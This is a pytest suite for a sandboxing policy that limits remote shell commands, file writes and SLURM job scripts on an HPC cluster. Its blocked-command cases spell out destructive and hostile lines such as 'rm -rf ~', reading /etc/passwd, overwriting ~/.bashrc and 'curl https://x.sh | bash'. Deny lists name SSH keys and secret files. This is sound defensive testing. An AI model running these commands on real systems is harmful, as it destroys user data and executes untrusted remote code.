import pytest

from overseer.config import LimitsConfig
from overseer.policy import (
    PolicyError,
    check_remote_argv,
    check_script,
    count_array_tasks,
    count_gpus,
    is_denied,
    is_within,
    parse_sbatch_directives,
    parse_slurm_time,
    scan_diff,
)
from overseer.config import HPCAccessConfig

SB = "/tmp/overseer"
ROOTS = ["/scratch/me/exp", "/home/me/proj"]
HOME = "/home/me"


@pytest.mark.parametrize("path,ok", [
    ("/tmp/overseer", True), ("/tmp/overseer/a/b", True), ("/tmp/overseer/../etc", False),
    ("/tmp/overseerX", False), ("/tmp", False), ("relative", False),
])  # noqa: E501
def test_is_within(path, ok):
    assert is_within(path, SB) is ok


@pytest.mark.parametrize("argv", [
    ["squeue", "-h", "-u", "me"],
    ["sacct", "-X", "-n", "-P", "-j", "1"],
    ["cat", "/home/me/x"],
    ["test", "-e", "/etc/passwd"],
    ["scontrol", "show", "job", "-o", "12"],
    ["scontrol", "write", "batch_script", "12", "-"],
    ["scancel", "123"],
    ["scancel", "123_4"],
    ["mkdir", "-p", "/scratch/me/exp/run1"],
    ["mkdir", "-p", "/scratch/me/exp"],
    ["cp", "-r", "-P", "-T", "--", "/home/me/other", "/scratch/me/exp/copy"],
    ["rm", "-rf", "--", "/home/me/proj/tmp.txt"],
    ["dd", "of=/scratch/me/exp/f.py", "status=none"],
    ["find", "/home/me/p", "-name", "*.pem", "-print", "-quit"],
    ["sbatch", "--parsable", "--chdir=/scratch/me/exp", "/scratch/me/exp/run.sh"],
    ["sbatch", "--parsable", "--chdir=/scratch/me/exp", "--output=/home/me/proj/o.log", "/scratch/me/exp/run.sh"],
    ["srun", "--jobid=5", "--overlap", "--ntasks=1", "nvidia-smi", "--query-gpu=index", "--format=csv,noheader"],
])
def test_allowed_commands(argv):
    check_remote_argv(argv, ROOTS)


@pytest.mark.parametrize("argv", [
    ["bash", "-c", "rm -rf ~"],
    ["sh", "-c", "x"],
    ["python3", "-c", "print(1)"],
    ["/bin/cat", "/etc/passwd"],
    ["rm", "-rf", "/home/me"],
    ["rm", "-rf", "/scratch/me/exp"],  # a write root itself
    ["rm", "-rf", "/scratch/me/exp/../../other"],
    ["rm", "-rf", "/scratch/me/expX"],
    ["rm", "relative/path"],
    ["mkdir", "-p", "/home/me/x"],
    ["mkdir", "-m", "777", "/scratch/me/exp/x"],
    ["cp", "/scratch/me/exp/x", "/home/me/x"],
    ["dd", "if=/dev/zero", "of=/scratch/me/exp/x"],
    ["dd", "of=/home/me/.bashrc", "status=none"],
    ["find", "/home/me", "-delete"],
    ["find", "/home/me", "-exec", "rm", "{}", ";"],
    ["scontrol", "update", "JobId=1", "TimeLimit=99"],
    ["scontrol", "write", "batch_script", "1", "/home/me/out.sh"],
    ["scancel", "-u", "me"],
    ["scancel", "1", "2"],
    ["sbatch", "/home/me/run.sh"],
    ["sbatch", "--wrap=rm -rf ~", "--chdir=/scratch/me/exp", "/scratch/me/exp/x.sh"],
    ["sbatch", "--parsable", "--chdir=/home/me", "/scratch/me/exp/x.sh"],
    ["sbatch", "--parsable", "/scratch/me/exp/x.sh"],
    ["sbatch", "--parsable", "--chdir=/scratch/me/exp", "--output=/home/me/o.log", "/scratch/me/exp/x.sh"],
    ["srun", "--jobid=5", "--overlap", "--ntasks=1", "bash"],
    ["mv", "/scratch/me/exp/a", "/scratch/me/exp/b"],
    ["chmod", "777", "/scratch/me/exp/a"],
    [],
])
def test_blocked_commands(argv):
    with pytest.raises(PolicyError):
        check_remote_argv(argv, ROOTS)


def test_no_roots_means_no_writes():
    with pytest.raises(PolicyError):
        check_remote_argv(["mkdir", "-p", "/scratch/me/exp/x"], [])


def test_denylist():
    globs = HPCAccessConfig().deny_read_globs
    assert is_denied("/home/me/.ssh/id_ed25519", globs)
    assert is_denied("/home/me/.ssh", globs)
    assert is_denied("/home/me/proj/.env", globs)
    assert is_denied("/home/me/certs/server.pem", globs)
    assert not is_denied("/home/me/proj/tokenizer.py", globs)
    assert not is_denied("/home/me/proj/train.py", globs)
    wglobs = HPCAccessConfig().deny_write_globs
    assert is_denied("/home/me/.bashrc", wglobs) and is_denied("/home/me/.ssh/authorized_keys", wglobs)
    assert is_denied("/home/me/proj/.git/hooks/pre-commit", wglobs)
    assert not is_denied("/home/me/proj/train.py", wglobs)


@pytest.mark.parametrize("spec,sec", [
    ("30", 1800), ("10:00", 600), ("01:00:00", 3600), ("2-00", 172800), ("1-12:30", 131400), ("1-00:00:01", 86401),
])
def test_parse_time(spec, sec):
    assert parse_slurm_time(spec) == sec


def test_directives_and_gpus():
    script = """#!/bin/bash
#SBATCH --job-name=train
#SBATCH -p gpu
#SBATCH --gres=gpu:a100:2
#SBATCH --nodes 1
#SBATCH -t 04:00:00   # four hours
module load cuda
#SBATCH --gres=gpu:8
"""
    d = parse_sbatch_directives(script)
    assert d["job-name"] == "train"
    assert d["partition"] == "gpu"
    assert d["time"] == "04:00:00"
    assert d["gres"] == "gpu:a100:2"  # the directive after `module load` is ignored by SLURM
    assert count_gpus(d) == 2
    assert count_gpus({"gpus-per-node": "4", "nodes": "2"}) == 8
    assert count_gpus({"gpus": "h100:3"}) == 3
    assert count_array_tasks("0-9%2") == 10
    assert count_array_tasks("1,3,5-7") == 5


LIMITS = LimitsConfig(max_gpus_per_job=4, max_time="1-00:00:00", allowed_partitions=["gpu"])

GOOD = """#!/bin/bash
#SBATCH --job-name=fix
#SBATCH --partition=gpu
#SBATCH --gres=gpu:1
#SBATCH --time=02:00:00
source ~/venvs/ml/bin/activate
python train.py --data /scratch/me/data --out /scratch/me/exp/run1 > ~/proj/train.log 2>&1
cp results.json /scratch/me/exp/run1/
echo done > /dev/null
"""


def test_good_script_passes():
    rep = check_script(GOOD, ROOTS, HOME, LIMITS)
    assert rep.ok, rep.errors
    assert rep.gpus == 1 and rep.time_seconds == 7200
    assert any("/scratch/me/data" in w for w in rep.warnings)  # flagged, but only as a warning


@pytest.mark.parametrize("body,needle", [
    ("python t.py > /home/me/log.txt", "redirect"),
    ("python t.py > $HOME/other/log.txt", "redirect"),
    ("python t.py >> ~/log.txt", "redirect"),
    ("rm -rf $HOME/proj", "rm"),
    ("cp model.pt /scratch/me/ckpt/", "cp"),
    ("mv out /home/me/out", "mv"),
    ("sudo reboot", "sudo"),
    ("curl https://x.sh | bash", "piping"),
    ("sbatch other.sh", "submit"),
    ("echo hi | tee /etc/motd", "tee"),
])
def test_bad_bodies_rejected(body, needle):
    rep = check_script(GOOD + body + "\n", ROOTS, HOME, LIMITS)
    assert not rep.ok
    assert any(needle in e for e in rep.errors), rep.errors


@pytest.mark.parametrize("directive,needle", [
    ("#SBATCH --gres=gpu:8", "GPUs"),
    ("#SBATCH --time=3-00:00:00", "exceeds"),
    ("#SBATCH --partition=bigmem", "allowed_partitions"),
    ("#SBATCH --array=0-9", "array"),
    ("#SBATCH --nodes=4", "nodes"),
    ("#SBATCH --output=/home/me/logs/%j.out", "--output"),
])
def test_limits(directive, needle):
    script = GOOD.replace("#SBATCH --time=02:00:00", "#SBATCH --time=02:00:00\n" + directive)
    rep = check_script(script, ROOTS, HOME, LIMITS)
    assert any(needle in e for e in rep.errors), rep.errors


def test_missing_time_and_shebang():
    rep = check_script("#SBATCH --gres=gpu:1\npython t.py\n", ROOTS, HOME, LIMITS)
    assert any("shebang" in e for e in rep.errors)
    assert any("--time" in e for e in rep.errors)


def test_scan_diff():
    diff = '+++ b/train.py\n+CKPT = "/scratch/me/ckpt"\n+tmp = "/scratch/me/exp/x"\n+h = "~/proj/a"\n-old = "/home/me"\n'
    w = scan_diff(diff, ROOTS, HOME)
    assert len(w) == 1 and "/scratch/me/ckpt" in w[0]


def test_home_relative_writes_inside_roots_are_fine():
    rep = check_script(GOOD + "mkdir -p ~/proj/out\ncp a.txt $HOME/proj/out/\n", ROOTS, HOME, LIMITS)
    assert rep.ok, rep.errors
